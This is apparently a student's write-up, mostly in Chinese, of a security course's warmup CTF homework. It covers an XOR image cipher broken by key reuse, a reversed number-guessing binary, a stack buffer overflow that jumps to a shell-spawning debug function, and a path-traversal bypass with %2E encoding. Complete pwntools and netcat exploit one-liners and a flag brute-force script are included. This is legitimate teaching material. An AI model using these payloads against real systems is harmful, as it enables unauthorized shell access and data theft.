# 0x00 Kickstart Writeup

The primary goal of this homework is to test students' ability to take this course and served as a warmup practice for the whole semester. The set contains four topics corresponding to crypto, web, reversing engineering, and pwn. Each problem is 50 points.

- [0x00 Kickstart Writeup](#0x00-kickstart-writeup)
  - [Crypto - To BF or NOT to BF](#crypto---to-bf-or-not-to-bf)
  - [Reverse - XAYB](#reverse---xayb)
  - [Pwn - Arch Check](#pwn---arch-check)
  - [Web - text2emoji](#web---text2emoji)

## Crypto - To BF or NOT to BF

題目給了加密方法的 python script，以及兩張經過加密的照片。從題目名稱來看，這題似乎有方法可以暴力解，但一定有個更輕鬆的解題方法存在，所以這個演算法中一定有漏洞存在：

```py
charset = string.ascii_letters + string.digits + '+='
fire, water, earth, air = [random.choice(charset) for _ in range(4)]

def combine(a, b):
    return ''.join([a,b])

def encrypt(arr):
    swamp  = combine(water, earth)
    energy = combine(fire, air)
    lava   = combine(fire, earth)
    life   = combine(swamp, energy)
    stone  = combine(lava, air)
    sand   = combine(stone, water)
    seed   = combine(sand, life)
    random.seed(seed)
    
    h, w = arr.shape
    for i in range(h):
        for j in range(w):
            arr[i][j] ^= random.randint(0,255)

for i in ['flag', 'golem']:
    msg = cv2.imread(i+'.png', cv2.IMREAD_GRAYSCALE)
    encrypt(msg)
    cv2.imwrite(i+'_enc.png', msg)
```

一開始看到這題我最先想到的其實是 Seed 也許可以從 Image 的 attribute 中找到。最一開始 `random.choice` 的部分使用的 Seed 是 Default Seed，也就是當下的 timestamp，如果我們可以從 Image 挾帶的 metadata 中找到相關資訊也許就可以直接找到正確的 `fire, water, earth, air`。但看了一下 metadata 後發現沒什麼可用的時間資訊。

回到演算法的部分，整個 encrypt 的部分其實是透過 `xor` 的方式進行。xor 最大的特性是**做兩次相同的運算結果為 0**，而這個整體加密流程中產生 key 的方法雖然看似很複雜，**但其實每張圖片使用的 random seed 是一樣的**，這就讓擁有兩張加密過後圖的我們可以透過兩張圖 xor 在一起的方式直接把 key 的效果底消，得到兩張原圖的疊加。

```
A -> First picture original bits
B -> Second picture original bits
key -> key bits

(A ^ key) ^ (B ^ key) = A ^ B
```

簡單的指令就可以做到這件事情：

```shell
# ImageMagick 7.1.0
./magick convert flag_enc.png golem_enc.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" decrypt.png
```

Flag 藏在解開後的圖中

## Reverse - XAYB

題目有提供一個檔案，`file` 看一下此檔案的相關資訊後可以知道這是一個 64-bit 的 ELF 執行檔：

```shell
┌──(kali㉿kali)-[~/Class/sec2021/hw0/XAYB]
└─$ file XAYB
XAYB: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=825727001154a3ce5d456150e5b313f3db4b55da, for GNU/Linux 3.2.0, not stripped

┌──(kali㉿kali)-[~/Class/sec2021/hw0/XAYB]
└─$ ./XAYB            
Enter something to start this game...
test
╔═╗┬ ┬┌─┐┌─┐┌─┐  ╔╗╔┬ ┬┌┬┐┌┐ ┌─┐┬─┐
║ ╦│ │├┤ └─┐└─┐  ║║║│ ││││├┴┐├┤ ├┬┘
╚═╝└─┘└─┘└─┘└─┘  ╝╚╝└─┘┴ ┴└─┘└─┘┴└─
Generating answer...
You have 3 chances to guess the answer. I'm so kind :)
The Lucky 5 digits number is ... > 123
1A 3B
The Lucky 5 digits number is ... > 3345
1A 0B
The Lucky 5 digits number is ... > 3213
2A 1B
```

執行起來這就是一個猜數字遊戲，似乎是猜對了就可以得到 Flag。當然你可以去 Reverse 數字產生的部分（`gen_ans`）以及後續怎麼使用這個檔案的機制（`game_logic` 的前半段），但從 ida 產出的 Graph 來看我覺得過於複雜，所以我的主要目標不會放在那邊。

![](./XAYB/img/Screen%20Shot%202021-09-20%20at%204.26.52%20PM.png)

另一個方法是靜態分析 + 動態分析來處理。在 `game_logic` 中尋找 `BINGO` 後的邏輯片段，可以發現有一段將 Flag 的原始資料解碼並且顯示到螢幕上的邏輯，所以我們只要從 Memory 中讀出原始資料後照著解碼邏輯跑一遍就可以得到我們的 Flag 了。

![](./XAYB/img/Screen%20Shot%202021-09-20%20at%204.33.47%20PM.png)

解碼 & 顯示邏輯：

![](./XAYB/img/Screen%20Shot%202021-09-20%20at%204.35.22%20PM.png)

直接打開 GDB 後在 `game_logic` 下一個 Break 後，取得存在 `rbp-38h` 上的記憶體位置並取出長度為 `2Dh+1` 的值。這些值都是還沒有 Decrypt 過的值：

![](./XAYB/img/Screen%20Shot%202021-09-20%20at%205.12.08%20PM.png)

接下來細看他的解碼方法後其實就只是把每個 Char 去跟 `0xF2` 做 `xor` 而已，所以寫個簡單的 Script 這題就可以完成了

```python
encodeedFlag = [0xb4, 0xbe, 0xb3, 0xb5, 0x89, 0xa5, 0xc2, 0x9d, 0xad, 0xa5,
                0xb3, 0xa5, 0xad, 0xab, 0xc2, 0xa7, 0xad, 0xc7, 0xc2, 0xad, 
                0xbe, 0x84, 0x91, 0xb9, 0x8b, 0xad, 0x85, 0x93, 0x86, 0x91, 
                0x9a, 0xad, 0x84, 0xad, 0xad, 0xbe, 0xb0, 0xa4, 0xc6, 0xcb, 
                0xa6, 0xa2, 0xb0, 0xb7, 0x95, 0x8f]

result = ""

for i in range(len(encodeedFlag)):
    result += chr(encodeedFlag[i] ^ 0xF2)

print(result)
```

! 9/24 update 解法，因為這題沒有多做什麼防禦，可以直接 RIP 指向解碼地方接著執行即可：

![](./XAYB/img/Screen%20Shot%202021-09-24%20at%208.37.58%20AM.png)

## Pwn - Arch Check

題目有給目標服務以及其執行檔：

```
nc up.zoolab.org 30001
```

一樣先用 file 看一下，以及 Happywalk:

```shell
┌──(kali㉿kali)-[~/Class/sec2021/hw0/arch_check]
└─$ file arch_check             
arch_check: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cfa0951e328de69ad9ceadd5764827713b4ab9c4, for GNU/Linux 3.2.0, not stripped

┌──(kali㉿kali)-[~/Class/sec2021/hw0/arch_check]
└─$ ./arch_check                
Hey, nice to meet you!
Just wanna ask, which linux distribution are you using?
kaliLinux
Ohh sweet, by the way, I use Arch 😊
```

到這邊其實就有一個感覺，因為這是勸退模式的作業，所以這題有大概率是 pwn 中最基本的 bof 問題，從形式上來看最終目標是取得目標伺服器上的 shell，進而在 FS 的某個地方找到我們的 flag。

```
┌──(kali㉿kali)-[~/Class/sec2021/hw0/arch_check]
└─$ checksec ./arch_check
[*] '/home/kali/Class/sec2021/hw0/arch_check/arch_check'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

要執行 Shell 有幾個辦法，可能是要自行植入 shell code，或是 jump 到已經在 System 中的某段 execve 的 system call。但這題其實沒有那麼複雜，而且 `NX-bit` 其實有打開也做不到 Shell code 的植入，整個執行檔中其實有個 `debug` function，就那麼剛好裏面是呼叫 system 執行 `sh` 這個指令，所以我們只要讓 Program 最後執行到這段程式碼就可以達到取得 Shell 的目的了。

![](./ArchCheck/img/Screen%20Shot%202021-09-20%20at%205.35.49%20PM.png)

接下來戲看一下 Main 中的 Function，最大的問題出在 `scanf` 並沒有寫吃入幾個 char，所以我們可以很自由的寫到 main 的 return 位置，跳到 Debug 的位置。

![](./ArchCheck/img/Screen%20Shot%202021-09-20%20at%205.41.11%20PM.png)

`scanf` 寫入的位置距離 ret 還有 `0x20 + 8` bytes 的位置，`debug` 的位置在 `0x4011DD`，有了這兩個資訊後就可以來寫 script 了。

```python
from pwn import *

context.arch = "amd64"

io = remote("up.zoolab.org", 30001)

io.recvuntil("distribution are you using?")

# Debug Position
io.sendline(b"A"*40+pack(0x4011DD))

io.recvline()

io.interactive()

io.close()
```

最後 Navigate 一下就可以找到 flag 的位置了（`/home/arch_check/flag`）

! 9/24 更新，其實用簡單的一行 Script 就可以搞定了：

```zsh
# 直接取得 Flag
python3 -c "import sys; sys.stdout.buffer.write(b'a'*40+b'\xdd\x11\x40\x00\x00\x00\x00\x00\ncat /home/arch_check/flag\n')" | nc up.zoolab.org 30001

# Interactive Mode
cat <(python3 -c "import sys; sys.stdout.buffer.write(b'a'*40+b'\xdd\x11\x40\x00\x00\x00\x00\x00\n')") - | nc up.zoolab.org 30001

# Python 2
cat <(python -c "print 'a'*40 + '\xdd\x11\x40\x00\x00\x00\x00\x00'") - | nc up.zoolab.org 30001
```

## Web - text2emoji

[網址](http://splitline.tw:5000/)一進去的畫面如下：

![](./text2emoji/img/Screen%20Shot%202021-09-20%20at%205.54.56%20PM.png)

基本功能就是輸入 emoji 的 text 名稱後系統會吐出 emoji。User control 的 api 是 `/public_api`，payload 格式是 JSON `text: "cat"`。

從提供的 Source Code 來看，這是一個用 express 寫的簡單後端伺服器，**分為 Public 以及 Private Server**，運作方式是 public_api 取得 text 後，**把這個 text 濾掉 `.` 後直接當作 private server 的 url 去取資料**。這個 path traversal 防禦基本上等於沒做，因為 `.` 有別的 encode 方式（最有名的就是 `%2E`）就可以直接 bypass 掉了。

```js
app.post("/public_api", (request, response) => {
    const text = request.body.text.toString();

    if (!text.match(/^\S+$/) || text.includes(".")) {
        response.send({ error: "Bad parameter" });
        return;
    }

    const url = `http://127.0.0.1:7414/api/v1/emoji/${text}`;
    http.get(url, result => {
        result.setEncoding("utf-8");
        if (result.statusCode === 200)
            result.on('data', data => response.send(JSON.parse(data)));
        else
            response.send({ error: result.statusCode });
    });
});
```

剛好 private server 又有開一隻 API `/looksLikeFlag`，可以用來 check query 中的字串是不是在 Flag 中有出現。所以我們目標就很明確了，給個簡單的 Charset 去一個一個測試 flag 的組合，就可以得到我們的 Flag 了。

```py
from requests import post, get
from tqdm import tqdm
import string
import json

targetUrl = "http://splitline.tw:5000/public_api"
getPayload = "%2E%2E/looksLikeFlag"

flag = "FLAG{"

charset = string.ascii_letters + string.digits + '+=_\{\}'

while True:
    test = False
    for c in tqdm(charset):

        payload = {"text": f"{getPayload}?flag={flag+c}"}
        print(payload)

        data = post(targetUrl, json=payload)
        
        if "true" in data.text:
            flag+=c
            test = True
            print(flag)
            break

    if not test:
        break

print(flag)
```